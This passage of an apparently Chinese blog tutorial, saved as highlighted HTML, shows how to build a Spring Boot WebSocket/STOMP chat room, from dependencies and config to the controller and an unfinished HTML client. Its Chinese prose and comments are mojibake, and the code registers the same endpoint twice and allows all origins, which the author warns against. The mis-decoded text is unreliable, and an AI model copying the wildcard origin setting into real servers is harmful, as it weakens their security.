ä½ ï¼šåƒçš„å•¥ï¼Ÿï¼ˆè¯·æ±‚ï¼‰
æœåŠ¡å™¨ï¼š...ä½ çƒ¦ä¸çƒ¦ï¼ˆå“åº”ï¼‰

<span class="hljs-comment">// WebSocketçš„ç•…èŠåœºæ™¯ï¼š</span>
ä½ ï¼š&lt;è¿æ¥å»ºç«‹&gt;
ä½ ï¼šåƒäº†å—ï¼Ÿ
æœåŠ¡å™¨ï¼šåƒäº†ï¼Œåƒçš„ç‚¸é¸¡
æœåŠ¡å™¨ï¼šä½ è¦ä¸è¦ä¹Ÿæ¥ç‚¹ï¼Ÿ
ä½ ï¼šè¦è¦è¦ï¼åŠ æ¯å¯ä¹ï¼
<span class="hljs-comment">// ... è‡ªç”±æµç•…çš„å¯¹è¯ç»§ç»­</span>
</code></pre>
<h2 data-id="heading-1">äºŒã€SpringBooté›†æˆWebSocketè¯¦ç»†æ­¥éª¤</h2>
<h3 data-id="heading-2">ç¬¬1æ­¥ï¼šå¼•å…¥ä¾èµ–â€”â€”ç»™é¡¹ç›®â€œçŒå’–å•¡â€</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- SpringBootçš„WebSocketâ€œå’–å•¡åŒ…â€ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- å‰ç«¯ç”¨Stompçš„â€œå¸ç®¡â€å–å’–å•¡ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>stomp-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- å‰ç«¯ç”¨SockJSçš„â€œå¤‡ç”¨å¸ç®¡â€ï¼ˆä¸‡ä¸€ä¸»å¸ç®¡åäº†ï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.webjars<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sockjs-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">ç¬¬2æ­¥ï¼šé…ç½®ç±»â€”â€”æ­å»ºèŠå¤©å®¤çš„â€œåŸºç¡€è®¾æ–½â€</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.messaging.simp.config.MessageBrokerRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.EnableWebSocketMessageBroker;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.StompEndpointRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.socket.config.annotation.WebSocketMessageBrokerConfigurer;

<span class="hljs-comment">/**
 * WebSocketé…ç½®ç±»
 * æƒ³è±¡æˆç»™èŠå¤©å®¤è£…ä¸Šé—¨ã€çª—æˆ·å’Œå¹¿æ’­å–‡å­
 */</span>
@Configuration
@EnableWebSocketMessageBroker  <span class="hljs-comment">// è¿™å¥å’’è¯­çš„æ„æ€æ˜¯ï¼šâ€œèŠéº»å¼€é—¨ï¼Œæˆ‘è¦ç”¨WebSocketï¼â€</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> implements WebSocketMessageBrokerConfigurer {

    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">configureMessageBroker</span><span class="hljs-params">(MessageBrokerRegistry config)</span> </span>{
        <span class="hljs-comment">// é…ç½®æ¶ˆæ¯ä»£ç†ï¼Œç›¸å½“äºè®¾ç½®èŠå¤©å®¤çš„â€œå¹¿æ’­ç«™â€</span>
        config.<span class="hljs-built_in">enableSimpleBroker</span>(<span class="hljs-string">"/topic"</span>, <span class="hljs-string">"/queue"</span>);  <span class="hljs-comment">// ç®€å•å†…å­˜ä»£ç†</span>
        
        <span class="hljs-comment">// è®¾ç½®åº”ç”¨ç¨‹åºçš„ç›®çš„åœ°å‰ç¼€</span>
        <span class="hljs-comment">// å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯åˆ° /app/xxxï¼Œå°±åƒå¯„ä¿¡è¦å†™â€œXXçœXXå¸‚â€</span>
        config.<span class="hljs-built_in">setApplicationDestinationPrefixes</span>(<span class="hljs-string">"/app"</span>);
        
        <span class="hljs-comment">// ç”¨æˆ·ç§èŠå‰ç¼€ï¼ˆç‚¹å¯¹ç‚¹ï¼‰</span>
        config.<span class="hljs-built_in">setUserDestinationPrefix</span>(<span class="hljs-string">"/user"</span>);
    }

    @<span class="hljs-function">Override
    <span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">registerStompEndpoints</span><span class="hljs-params">(StompEndpointRegistry registry)</span> </span>{
        <span class="hljs-comment">// æ³¨å†ŒWebSocketç«¯ç‚¹ï¼Œç›¸å½“äºç»™èŠå¤©å®¤å®‰è£…â€œå¤§é—¨â€</span>
        registry.<span class="hljs-built_in">addEndpoint</span>(<span class="hljs-string">"/ws-chat"</span>)
                .<span class="hljs-built_in">setAllowedOriginPatterns</span>(<span class="hljs-string">"*"</span>)  <span class="hljs-comment">// å…è®¸æ‰€æœ‰æ¥æºï¼ˆç”Ÿäº§ç¯å¢ƒåˆ«è¿™ä¹ˆå¹²ï¼ï¼‰</span>
                .<span class="hljs-built_in">withSockJS</span>();  <span class="hljs-comment">// åå¤‡é€‰é¡¹ï¼Œä¸‡ä¸€æµè§ˆå™¨å¤ªè€ï¼Œå°±é™çº§ä½¿ç”¨HTTPé•¿è½®è¯¢</span>
        
        <span class="hljs-comment">// å†æ¥ä¸€ä¸ªä¸å¸¦SockJSçš„ï¼Œç»™ç°ä»£æµè§ˆå™¨ç”¨</span>
        registry.<span class="hljs-built_in">addEndpoint</span>(<span class="hljs-string">"/ws-chat"</span>)
                .<span class="hljs-built_in">setAllowedOriginPatterns</span>(<span class="hljs-string">"*"</span>);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"èŠå¤©å®¤å¤§é—¨å·²å®‰è£…ï¼é—¨ç‰Œå·ï¼š/ws-chat"</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"å¤‡ç”¨æ–¹æ¡ˆï¼šSockJSå·²å°±ä½ï¼ŒIE6ä¹Ÿèƒ½å‡‘åˆç”¨ï¼ˆå¤§æ¦‚å§ï¼‰"</span>);
    }
}
</code></pre>
<h3 data-id="heading-4">ç¬¬3æ­¥ï¼šæ¶ˆæ¯æ§åˆ¶å™¨â€”â€”èŠå¤©å®¤çš„â€œä¸»æŒäººâ€</h3>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.MessageMapping</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Payload</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.SendTo</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.simp</span><span class="hljs-selector-class">.SimpMessageHeaderAccessor</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.simp</span><span class="hljs-selector-class">.SimpMessagingTemplate</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Controller</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.LocalDateTime</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.format</span><span class="hljs-selector-class">.DateTimeFormatter</span>;

<span class="hljs-comment">/**
 * èŠå¤©æ§åˆ¶å™¨
 * è¿™ä½å°±æ˜¯èŠå¤©å®¤çš„ä¸»æŒäººï¼Œè´Ÿè´£å–Šï¼šâ€œXXè¯´äº†ä¸€å¥è¯ï¼Œå¤§å®¶å¿«å¬ï¼â€
 */</span>
@<span class="hljs-selector-tag">Controller</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">ChatController</span> {
    
    <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">final</span> <span class="hljs-selector-tag">SimpMessagingTemplate</span> <span class="hljs-selector-tag">messagingTemplate</span>;
    
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatController</span>(SimpMessagingTemplate messagingTemplate) {
        <span class="hljs-selector-tag">this</span><span class="hljs-selector-class">.messagingTemplate</span> = <span class="hljs-selector-tag">messagingTemplate</span>;
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"èŠå¤©ä¸»æŒäººå·²å°±ä½ï¼Œè¯ç­’æµ‹è¯•ï¼šå–‚å–‚å–‚~"</span>);
    }
    
    <span class="hljs-comment">/**
     * å¹¿æ’­æ¶ˆæ¯ - å¤§å…èŠå¤©
     * å®¢æˆ·ç«¯å‘é€åˆ°ï¼š/app/chat.sendMessage
     * æœåŠ¡ç«¯å¹¿æ’­åˆ°ï¼š/topic/public
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.sendMessage"</span>)  <span class="hljs-comment">// æ¥æ”¶æ¶ˆæ¯çš„â€œä¿¡ç®±â€</span>
    @<span class="hljs-selector-tag">SendTo</span>(<span class="hljs-string">"/topic/public"</span>)  <span class="hljs-comment">// å¹¿æ’­çš„â€œå¤§å–‡å­â€</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatMessage</span> <span class="hljs-selector-tag">sendMessage</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage) {
        <span class="hljs-comment">// ç»™æ¶ˆæ¯æ‰“ä¸ªæ—¶é—´æˆ³ï¼Œå°±åƒèŠå¤©è®°å½•çš„æ—¶é—´æ ‡è®°</span>
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"å¹¿æ’­æ¶ˆæ¯ï¼š"</span> + chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">"è¯´ï¼š"</span> + chatMessage.<span class="hljs-built_in">getContent</span>());
        
        <span class="hljs-comment">// å¦‚æœæ˜¯ç³»ç»Ÿæ¶ˆæ¯ï¼ˆæ¯”å¦‚æœ‰äººåŠ å…¥/é€€å‡ºï¼‰</span>
        <span class="hljs-selector-tag">if</span> (chatMessage.<span class="hljs-built_in">getType</span>() == MessageType.JOIN) {
            <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setContent</span>(chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">" é—ªäº®ç™»åœºï¼"</span>);
        } <span class="hljs-selector-tag">else</span> <span class="hljs-selector-tag">if</span> (chatMessage.<span class="hljs-built_in">getType</span>() == MessageType.LEAVE) {
            <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setContent</span>(chatMessage.<span class="hljs-built_in">getSender</span>() + <span class="hljs-string">" æºœäº†æºœäº†~ "</span>);
        }
        
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">chatMessage</span>;
    }
    
    <span class="hljs-comment">/**
     * ç”¨æˆ·åŠ å…¥ - ç›¸å½“äºè¿›é—¨å–Šä¸€å£°â€œæˆ‘æ¥äº†ï¼â€
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.addUser"</span>)
    @<span class="hljs-selector-tag">SendTo</span>(<span class="hljs-string">"/topic/public"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">ChatMessage</span> <span class="hljs-selector-tag">addUser</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage,
                               SimpMessageHeaderAccessor headerAccessor) {
        
        <span class="hljs-comment">// åœ¨WebSocketä¼šè¯ä¸­ä¿å­˜ç”¨æˆ·åï¼Œå°±åƒç»™ç”¨æˆ·å‘ä¸ªâ€œåç‰Œâ€</span>
        <span class="hljs-selector-tag">headerAccessor</span><span class="hljs-selector-class">.getSessionAttributes</span>()<span class="hljs-selector-class">.put</span>(<span class="hljs-string">"username"</span>, chatMessage.<span class="hljs-built_in">getSender</span>());
        
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setType</span>(MessageType.JOIN);
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"æ–°ç”¨æˆ·åŠ å…¥ï¼š"</span> + chatMessage.<span class="hljs-built_in">getSender</span>());
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"å½“å‰åœ¨çº¿äººæ•°ï¼š+1ï¼ˆæˆ‘ä¹Ÿä¸ä¼šç®—ï¼Œå¤§æ¦‚å§ï¼‰"</span>);
        
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">chatMessage</span>;
    }
    
    <span class="hljs-comment">/**
     * ç§èŠåŠŸèƒ½ - å·å·è¯´æ‚„æ‚„è¯
     * @param to æ¥æ”¶è€…ç”¨æˆ·å
     */</span>
    @<span class="hljs-selector-tag">MessageMapping</span>(<span class="hljs-string">"/chat.private"</span>)
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">privateMessage</span>(<span class="hljs-variable">@Payload</span> ChatMessage chatMessage,
                               <span class="hljs-variable">@Header</span>(<span class="hljs-string">"to"</span>) String toUser) {
        
        <span class="hljs-selector-tag">chatMessage</span><span class="hljs-selector-class">.setTimestamp</span>(LocalDateTime.<span class="hljs-built_in">now</span>().<span class="hljs-built_in">format</span>(
            DateTimeFormatter.<span class="hljs-built_in">ofPattern</span>(<span class="hljs-string">"HH:mm:ss"</span>)
        ));
        
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"ç§èŠæ¶ˆæ¯ï¼š"</span> + chatMessage.<span class="hljs-built_in">getSender</span>() + 
                          <span class="hljs-string">" æ‚„æ‚„å¯¹ "</span> + toUser + <span class="hljs-string">" è¯´ï¼š"</span> + chatMessage.<span class="hljs-built_in">getContent</span>());
        
        <span class="hljs-comment">// å‘é€ç»™ç‰¹å®šç”¨æˆ·ï¼š/user/{ç”¨æˆ·å}/queue/private</span>
        <span class="hljs-selector-tag">messagingTemplate</span><span class="hljs-selector-class">.convertAndSendToUser</span>(
            toUser,
            <span class="hljs-string">"/queue/private"</span>,
            chatMessage
        );
        
        <span class="hljs-comment">// ä¹Ÿå‘ç»™è‡ªå·±ï¼Œè®©è‡ªå·±çœ‹åˆ°å‘é€çš„æ¶ˆæ¯</span>
        <span class="hljs-selector-tag">messagingTemplate</span><span class="hljs-selector-class">.convertAndSendToUser</span>(
            chatMessage.<span class="hljs-built_in">getSender</span>(),
            <span class="hljs-string">"/queue/private"</span>,
            chatMessage
        );
    }
    
    <span class="hljs-comment">/**
     * æ¶ˆæ¯æ¨¡å‹ç±» - èŠå¤©çš„â€œè¯­è¨€è§„èŒƒâ€
     */</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">class</span> <span class="hljs-selector-tag">ChatMessage</span> {
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">MessageType</span> <span class="hljs-selector-tag">type</span>;      <span class="hljs-comment">// æ¶ˆæ¯ç±»å‹</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">content</span>;        <span class="hljs-comment">// æ¶ˆæ¯å†…å®¹</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">sender</span>;         <span class="hljs-comment">// å‘é€è€…</span>
        <span class="hljs-selector-tag">private</span> <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">timestamp</span>;      <span class="hljs-comment">// æ—¶é—´æˆ³</span>
        
        <span class="hljs-comment">// æ„é€ æ–¹æ³•ã€getterã€setterçœç•¥ï¼ˆä½†å®é™…å¿…é¡»è¦æœ‰ï¼ï¼‰</span>
        <span class="hljs-comment">// æƒ³è±¡æˆï¼šæ¯ä¸ªæ¶ˆæ¯éƒ½è¦æœ‰ä¿¡å°ã€ä¿¡çº¸ã€å†™ä¿¡äººã€å†™ä¿¡æ—¶é—´</span>
    }
    
    <span class="hljs-comment">/**
     * æ¶ˆæ¯ç±»å‹æšä¸¾ - èŠå¤©è¡¨æƒ…åŒ…åˆ†ç±»
     */</span>
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">enum</span> <span class="hljs-selector-tag">MessageType</span> {
        <span class="hljs-selector-tag">CHAT</span>,   <span class="hljs-comment">// æ™®é€šèŠå¤©</span>
        <span class="hljs-selector-tag">JOIN</span>,   <span class="hljs-comment">// åŠ å…¥</span>
        <span class="hljs-selector-tag">LEAVE</span>   <span class="hljs-comment">// ç¦»å¼€</span>
    }
}
</code></pre>
<h3 data-id="heading-5">ç¬¬4æ­¥ï¼šå‰ç«¯å®ç°â€”â€”ç”¨æˆ·çš„â€œèŠå¤©ç•Œé¢â€</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- chat.html --&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SpringBootèŠå¤©å®¤ - ç¦æ­¢è®¨è®ºä¸ºä»€ä¹ˆä»£ç åˆæŠ¥é”™<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Comic Sans MS'</span>, cursive; }
        <span class="hljs-selector-id">#chat-container</span> { 
            <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid <span class="hljs-number">#4CAF50</span>; 
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#f5f7fa</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#c3cfe2</span> <span class="hljs-number">100%</span>);
        }
        <span class="hljs-selector-id">#message-area</span> {
            <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;
            <span class="hljs-attribute">overflow-y</span>: auto;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> dashed <span class="hljs-number">#ccc</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: white;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
        }
        <span class="hljs-selector-class">.message</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>; }
        <span class="hljs-selector-class">.my-message</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#e3f2fd</span>; <span class="hljs-attribute">text-align</span>: right; }
        <span class="hljs-selector-class">.their-message</span> { <span class="hljs-attribute">background</span>: <span class="hljs-number">#f1f8e9</span>; }
        <span class="hljs-selector-class">.system-message</span> { 
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff3e0</span>; 
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">font-style</span>: italic;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#ff9800</span>;
        }
        <span class="hljs-selector-class">.join-message</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#4CAF50</span>; }
        <span class="hljs-selector-class">.leave-message</span> { <span class="hljs-attribute">color</span>: <span class="hljs-number">#f44336</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chat-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>SpringBootèŠå¤©å®¤<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å½“å‰çŠ¶æ€ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"status"</span>&gt;</span>æ­£åœ¨è¿æ¥...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"connect-area"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"å–ä¸ªéœ¸æ°”çš„æ˜µç§°"</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"connect()"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"connect-btn"</span>&gt;</span>è¿›å…¥èŠå¤©å®¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chat-area"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message-area"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"message-input"</span> 
                       <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯´ç‚¹ä»€ä¹ˆå§..."</span> 
                       <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 70%; padding: 10px;"</span>
                       <span class="hljs-attr">onkeypress</span>=<span class="hljs-string">"if(event.keyCode===13) sendMessage()"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendMessage()"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"padding: 10px;"</span>&gt;</span>å‘é€<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 20px;"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"private-to"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"ç§èŠå¯¹è±¡æ˜µç§°"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"private-message"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"æ‚„æ‚„è¯å†…å®¹"</span> /&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendPrivate()"</span>&gt;</span>å‘é€æ‚„æ‚„è¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- å¼•å…¥WebSocketå®¢æˆ·ç«¯åº“ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/webjars/sockjs-client/sockjs.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/webjars/stomp-websocket/stomp.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">let</span> stompClient = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">let</span> username = <span class="hljs-literal">null</span>;
        
        <span class="hljs-comment">// è¿æ¥WebSocket - ç›¸å½“äºâ€œæ•²é—¨â€</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params"/>) {
            username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'username'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            <span class="hljs-keyword">if</span> (!username) {
                <span class="hljs-title function_">alert</span>(<span class="hljs-string">"è¯·å…ˆå–ä¸ªæ˜µç§°ï¼ä¸èƒ½å«'æ— åæ°'å§ï¼Ÿ"</span>);
                <span class="hljs-keyword">return</span>;
            }
            
